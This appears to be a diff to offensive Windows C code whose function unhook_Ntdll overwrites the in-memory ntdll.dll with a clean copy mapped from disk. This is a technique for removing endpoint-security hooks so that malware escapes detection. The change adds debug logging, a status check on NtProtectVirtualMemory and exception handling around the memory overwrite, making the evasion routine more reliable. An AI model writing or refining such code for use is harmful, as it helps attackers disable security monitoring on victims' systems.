@@ -183,13 +183,13 @@ BOOL unhook_Ntdll() {
 
     HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll",
         GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) return 0;
+    if (hFile == INVALID_HANDLE_VALUE) { printf("[x] unhook_Ntdll: open file failed %lu\n", GetLastError()); return 0; }
 
     HANDLE hMap = CreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
-    if (!hMap) { CloseHandle(hFile); return 0; }
+    if (!hMap) { printf("[x] unhook_Ntdll: CreateFileMapping failed %lu\n", GetLastError()); CloseHandle(hFile); return 0; }
 
     PVOID pDisk = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
-    if (!pDisk) { CloseHandle(hMap); CloseHandle(hFile); return 0; }
+    if (!pDisk) { printf("[x] unhook_Ntdll: MapViewOfFile failed %lu\n", GetLastError()); CloseHandle(hMap); CloseHandle(hFile); return 0; }
 
     HMODULE hMem = GetModuleHandleW(L"ntdll.dll");
     IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)hMem;
@@ -204,10 +204,16 @@ BOOL unhook_Ntdll() {
             PVOID base = dst;
             SIZE_T sz = size;
             DWORD old = 0;
-            iNtProtectVirtualMemory(GetCurrentProcess(), &base, &sz, PAGE_EXECUTE_READWRITE, &old);
-            RtlCopyMemory(dst, src, size);
-            FlushInstructionCache(GetCurrentProcess(), dst, size);
-            iNtProtectVirtualMemory(GetCurrentProcess(), &base, &sz, old, &old);
+            __try {
+                NTSTATUS s = iNtProtectVirtualMemory(GetCurrentProcess(), &base, &sz, PAGE_EXECUTE_READWRITE, &old);
+                printf("[x] unhook_Ntdll: NtProtectVirtualMemory -> 0x%lX base=%p size=%lu\n", s, base, (unsigned long)sz);
+                if (!NT_SUCCESS(s)) { printf("[x] unhook_Ntdll: protect failed, abort\n"); break; }
+                RtlCopyMemory(dst, src, size);
+                FlushInstructionCache(GetCurrentProcess(), dst, size);
+                iNtProtectVirtualMemory(GetCurrentProcess(), &base, &sz, old, &old);
+            } __except (GetExceptionCode() == EXCEPTION_BREAKPOINT ? EXCEPTION_CONTINUE_SEARCH : EXCEPTION_EXECUTE_HANDLER) {
+                printf("[x] unhook_Ntdll: EXCEPTION in copy 0x%08lX\n", GetExceptionCode());
+            }
             UnmapViewOfFile(pDisk);
             CloseHandle(hMap);
             CloseHandle(hFile);
